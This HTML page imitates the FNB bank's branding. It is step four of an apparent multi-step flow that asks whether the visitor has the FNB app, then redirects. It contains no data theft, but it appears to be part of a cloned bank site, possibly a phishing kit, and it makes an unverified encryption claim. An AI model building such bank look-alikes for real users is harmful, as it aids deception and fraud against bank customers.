<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FNB - Banking App</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, #ffffff 0%, #f0f9ff 30%, #e6f7f6 70%, #ccfbf1 100%);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            overflow-x: hidden;
        }

        /* Background Shapes */
        .bg-shape {
            position: fixed;
            border-radius: 50%;
            opacity: 0.08;
            animation: floatShape 20s ease-in-out infinite;
            pointer-events: none;
            z-index: 0;
        }

        .bg-shape-1 {
            width: 400px;
            height: 400px;
            background: #00a79d;
            top: -100px;
            right: -100px;
            animation-delay: 0s;
        }

        .bg-shape-2 {
            width: 300px;
            height: 300px;
            background: #f5a623;
            bottom: -80px;
            left: -80px;
            animation-delay: -5s;
        }

        .bg-shape-3 {
            width: 200px;
            height: 200px;
            background: #00a79d;
            top: 50%;
            left: 10%;
            animation-delay: -10s;
        }

        @keyframes floatShape {
            0%, 100% { transform: translate(0, 0) scale(1); }
            25% { transform: translate(30px, -30px) scale(1.05); }
            50% { transform: translate(-20px, 20px) scale(0.95); }
            75% { transform: translate(20px, 30px) scale(1.02); }
        }

        /* Step Indicator */
        .step-indicator {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 30px;
            position: relative;
            z-index: 1;
            opacity: 0;
            animation: fadeInDown 0.8s ease-out 0.1s forwards;
        }

        .step {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 10px 20px;
            background: white;
            border-radius: 50px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
            font-size: 0.85rem;
            font-weight: 600;
            color: #94a3b8;
            transition: all 0.4s ease;
        }

        .step.active {
            background: #00a79d;
            color: white;
            box-shadow: 0 8px 25px rgba(0, 167, 157, 0.35);
            transform: scale(1.05);
        }

        .step.completed {
            background: #e6f7f6;
            color: #00a79d;
        }

        .step-number {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background: currentColor;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.75rem;
            font-weight: 700;
        }

        .step.active .step-number {
            background: white;
            color: #00a79d;
        }

        .step.completed .step-number {
            background: #00a79d;
            color: white;
        }

        .step-divider {
            width: 30px;
            height: 2px;
            background: #e2e8f0;
            border-radius: 1px;
        }

        /* Logo */
        .logo-container {
            margin-bottom: 25px;
            text-align: center;
            position: relative;
            z-index: 1;
            opacity: 0;
            animation: fadeInDown 0.8s ease-out 0.2s forwards;
        }

        .logo-container img {
            width: 90px;
            height: 90px;
            border-radius: 50%;
            object-fit: cover;
            box-shadow: 0 15px 50px rgba(0, 167, 157, 0.35);
            animation: logoPulse 3s ease-in-out infinite;
            transition: transform 0.4s ease;
        }

        .logo-container img:hover {
            transform: scale(1.1) rotate(5deg);
        }

        @keyframes logoPulse {
            0%, 100% { transform: scale(1); box-shadow: 0 15px 50px rgba(0, 167, 157, 0.35); }
            50% { transform: scale(1.06); box-shadow: 0 20px 60px rgba(0, 167, 157, 0.5); }
        }

        .logo-container h2 {
            margin-top: 12px;
            color: #00a79d;
            font-weight: 800;
            letter-spacing: 4px;
            font-size: 1.6rem;
        }

        /* Card */
        .app-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            padding: 50px 45px;
            border-radius: 28px;
            box-shadow: 
                0 25px 80px rgba(0, 0, 0, 0.08),
                0 0 0 1px rgba(255, 255, 255, 0.5) inset;
            width: 100%;
            max-width: 500px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.6);
            position: relative;
            z-index: 1;
            opacity: 0;
            animation: fadeInUp 1s ease-out 0.5s forwards;
            transition: transform 0.4s ease, box-shadow 0.4s ease;
        }

        .app-card:hover {
            transform: translateY(-5px);
            box-shadow: 
                0 35px 100px rgba(0, 167, 157, 0.12),
                0 0 0 1px rgba(255, 255, 255, 0.5) inset;
        }

        .app-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 80px;
            height: 4px;
            background: linear-gradient(90deg, transparent, #00a79d, transparent);
            border-radius: 2px;
            opacity: 0;
            animation: fadeIn 0.6s ease-out 1s forwards;
        }

        .app-card h1 {
            font-size: 1.7rem;
            font-weight: 800;
            color: #0f172a;
            margin-bottom: 12px;
            line-height: 1.3;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 0.8s forwards;
        }

        .app-card .subtitle {
            color: #64748b;
            font-size: 1rem;
            margin-bottom: 35px;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 1s forwards;
        }

        /* Phone Illustration */
        .phone-illustration {
            width: 120px;
            height: 200px;
            margin: 0 auto 30px;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            border-radius: 20px;
            position: relative;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.2);
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 1.1s forwards, phoneFloat 4s ease-in-out infinite 1.5s;
            border: 3px solid #e2e8f0;
        }

        .phone-illustration::before {
            content: '';
            position: absolute;
            top: 12px;
            left: 50%;
            transform: translateX(-50%);
            width: 40px;
            height: 4px;
            background: #334155;
            border-radius: 2px;
        }

        .phone-illustration::after {
            content: '';
            position: absolute;
            bottom: 8px;
            left: 50%;
            transform: translateX(-50%);
            width: 30px;
            height: 30px;
            border: 2px solid #334155;
            border-radius: 50%;
        }

        .phone-screen {
            position: absolute;
            top: 28px;
            left: 8px;
            right: 8px;
            bottom: 45px;
            background: linear-gradient(135deg, #00a79d 0%, #008c82 100%);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .phone-screen::before {
            content: 'FNB';
            color: white;
            font-weight: 800;
            font-size: 1.2rem;
            letter-spacing: 2px;
        }

        .phone-screen::after {
            content: '';
            position: absolute;
            width: 60px;
            height: 60px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            animation: pulseRing 2s ease-in-out infinite;
        }

        @keyframes phoneFloat {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }

        @keyframes pulseRing {
            0%, 100% { transform: scale(0.8); opacity: 0.5; }
            50% { transform: scale(1.2); opacity: 0; }
        }

        /* Option Buttons */
        .options-container {
            display: flex;
            gap: 16px;
            margin-bottom: 25px;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 1.3s forwards;
        }

        .option-btn {
            flex: 1;
            padding: 20px;
            background: white;
            border: 2px solid #e2e8f0;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .option-btn:hover {
            border-color: #00a79d;
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(0, 167, 157, 0.15);
        }

        .option-btn.selected {
            border-color: #00a79d;
            background: linear-gradient(135deg, #e6f7f6 0%, #f0fdfa 100%);
            box-shadow: 0 10px 30px rgba(0, 167, 157, 0.2);
            transform: scale(1.02);
        }

        .option-btn.selected::after {
            content: '✓';
            position: absolute;
            top: 8px;
            right: 8px;
            width: 24px;
            height: 24px;
            background: #00a79d;
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.8rem;
            font-weight: 700;
            animation: scaleIn 0.3s ease-out;
        }

        .option-icon {
            font-size: 2.5rem;
            margin-bottom: 10px;
            display: block;
        }

        .option-label {
            font-weight: 700;
            color: #0f172a;
            font-size: 1rem;
            display: block;
        }

        .option-desc {
            font-size: 0.8rem;
            color: #94a3b8;
            margin-top: 4px;
            display: block;
        }

        /* Continue Button */
        .continue-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #00a79d 0%, #008c82 100%);
            color: white;
            border: none;
            border-radius: 16px;
            font-weight: 700;
            font-size: 1.05rem;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            position: relative;
            overflow: hidden;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 1.5s forwards;
        }

        .continue-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.6s ease;
        }

        .continue-btn:hover::before {
            left: 100%;
        }

        .continue-btn:hover {
            background: linear-gradient(135deg, #008c82 0%, #007a71 100%);
            transform: translateY(-3px);
            box-shadow: 0 15px 45px rgba(0, 167, 157, 0.4);
        }

        .continue-btn:active {
            transform: translateY(-1px);
        }

        .continue-btn:disabled {
            background: #94a3b8;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .continue-btn.hidden {
            display: none;
        }

        .btn-loader {
            width: 22px;
            height: 22px;
            border: 3px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: none;
        }

        .continue-btn.loading .btn-loader {
            display: inline-block;
        }

        .continue-btn.loading .btn-text {
            display: none;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @keyframes scaleIn {
            from { opacity: 0; transform: scale(0); }
            to { opacity: 1; transform: scale(1); }
        }

        /* Back Link */
        .back-link {
            margin-top: 25px;
            color: #64748b;
            font-size: 0.9rem;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            transition: all 0.3s ease;
            padding: 8px 16px;
            border-radius: 10px;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 1.7s forwards;
        }

        .back-link:hover {
            color: #00a79d;
            background: rgba(0, 167, 157, 0.08);
            transform: translateX(-4px);
        }

        .back-link svg {
            transition: transform 0.3s ease;
        }

        .back-link:hover svg {
            transform: translateX(-4px);
        }

        /* Footer Note */
        .footer-note {
            margin-top: 25px;
            color: #94a3b8;
            font-size: 0.8rem;
            text-align: center;
            position: relative;
            z-index: 1;
            opacity: 0;
            animation: fadeIn 1s ease-out 1.9s forwards;
        }

        .footer-note span {
            color: #00a79d;
            font-weight: 600;
        }

        .footer-note .lock-icon {
            display: inline-block;
            animation: lockPulse 2s ease-in-out infinite;
        }

        @keyframes lockPulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.2); }
        }

        /* Floating particles */
        .particle {
            position: fixed;
            width: 6px;
            height: 6px;
            background: rgba(0, 167, 157, 0.2);
            border-radius: 50%;
            pointer-events: none;
            z-index: 0;
            animation: particleFloat 15s ease-in-out infinite;
        }

        @keyframes particleFloat {
            0%, 100% { transform: translateY(100vh) scale(0); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes fadeInDown {
            from { opacity: 0; transform: translateY(-30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @media (max-width: 600px) {
            .app-card {
                padding: 35px 25px;
                border-radius: 24px;
            }

            .app-card h1 {
                font-size: 1.5rem;
            }

            .logo-container img {
                width: 80px;
                height: 80px;
            }

            .phone-illustration {
                width: 100px;
                height: 170px;
            }

            .options-container {
                flex-direction: column;
            }

            .step {
                padding: 8px 14px;
                font-size: 0.75rem;
            }

            .step-divider {
                width: 15px;
            }
        }
    </style>
</head>
<body>

    <!-- Background Shapes -->
    <div class="bg-shape bg-shape-1"></div>
    <div class="bg-shape bg-shape-2"></div>
    <div class="bg-shape bg-shape-3"></div>

    <!-- Floating Particles -->
    <div class="particle" style="left: 10%; animation-delay: 0s; animation-duration: 12s;"></div>
    <div class="particle" style="left: 25%; animation-delay: 3s; animation-duration: 15s;"></div>
    <div class="particle" style="left: 50%; animation-delay: 6s; animation-duration: 18s;"></div>
    <div class="particle" style="left: 75%; animation-delay: 2s; animation-duration: 14s;"></div>
    <div class="particle" style="left: 90%; animation-delay: 5s; animation-duration: 16s;"></div>

    <!-- Step Indicator -->
    <div class="step-indicator">
        <div class="step completed">
            <span class="step-number">✓</span>
            <span>Request</span>
        </div>
        <div class="step-divider"></div>
        <div class="step completed">
            <span class="step-number">✓</span>
            <span>Details</span>
        </div>
        <div class="step-divider"></div>
        <div class="step completed">
            <span class="step-number">✓</span>
            <span>Confirm</span>
        </div>
        <div class="step-divider"></div>
        <div class="step active">
            <span class="step-number">4</span>
            <span>App</span>
        </div>
    </div>

    <!-- Logo -->
    <div class="logo-container">
        <img src="images.png" alt="FNB Logo">
        <h2>FNB</h2>
    </div>

    <!-- App Card -->
    <div class="app-card">
        <h1>Do you have a banking app?</h1>
        <p class="subtitle">Let us know if you're already using our mobile banking services.</p>

        <!-- Phone Illustration -->
        <div class="phone-illustration">
            <div class="phone-screen"></div>
        </div>

        <!-- Options -->
        <div class="options-container">
            <button type="button" class="option-btn" data-value="yes" id="btn-yes">
                <span class="option-icon">📱</span>
                <span class="option-label">Yes</span>
                <span class="option-desc">I have the FNB app</span>
            </button>
            <button type="button" class="option-btn" data-value="no" id="btn-no">
                <span class="option-icon">🆕</span>
                <span class="option-label">No</span>
                <span class="option-desc">I don't have it yet</span>
            </button>
        </div>

        <button type="button" class="continue-btn hidden" id="continue-btn">
            <span class="btn-loader"></span>
            <span class="btn-text">Continue →</span>
        </button>

        <a href="confirm.html" class="back-link">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M19 12H5M12 19l-7-7 7-7"/>
            </svg>
            Back to Confirm
        </a>
    </div>

    <p class="footer-note">
        <span class="lock-icon">🔒</span> Your information is <span>secure & confidential</span>. Protected by 256-bit encryption.
    </p>

    <script>
        // ===== OPTION SELECTION =====
        const btnYes = document.getElementById('btn-yes');
        const btnNo = document.getElementById('btn-no');
        const continueBtn = document.getElementById('continue-btn');
        let selectedOption = null;

        function selectOption(value) {
            selectedOption = value;

            // Reset both buttons
            btnYes.classList.remove('selected');
            btnNo.classList.remove('selected');

            // Select clicked button
            if (value === 'yes') {
                btnYes.classList.add('selected');
            } else {
                btnNo.classList.add('selected');
            }

            // Show continue button with animation
            continueBtn.classList.remove('hidden');
            continueBtn.style.animation = 'fadeInUp 0.5s ease-out forwards';
        }

        btnYes.addEventListener('click', () => selectOption('yes'));
        btnNo.addEventListener('click', () => selectOption('no'));

        // ===== CONTINUE =====
        continueBtn.addEventListener('click', function() {
            if (!selectedOption) return;

            // Save to localStorage
            localStorage.setItem('fnb_has_banking_app', selectedOption);
            localStorage.setItem('fnb_step4_time', new Date().toISOString());

            // Show loading
            continueBtn.classList.add('loading');
            continueBtn.disabled = true;

            // Redirect based on selection
            setTimeout(() => {
                if (selectedOption === 'yes') {
                    window.location.href = 'app-users.html';
                } else {
                    window.location.href = 'non-app-users.html';
                }
            }, 800);
        });
    </script>

</body>
</html>
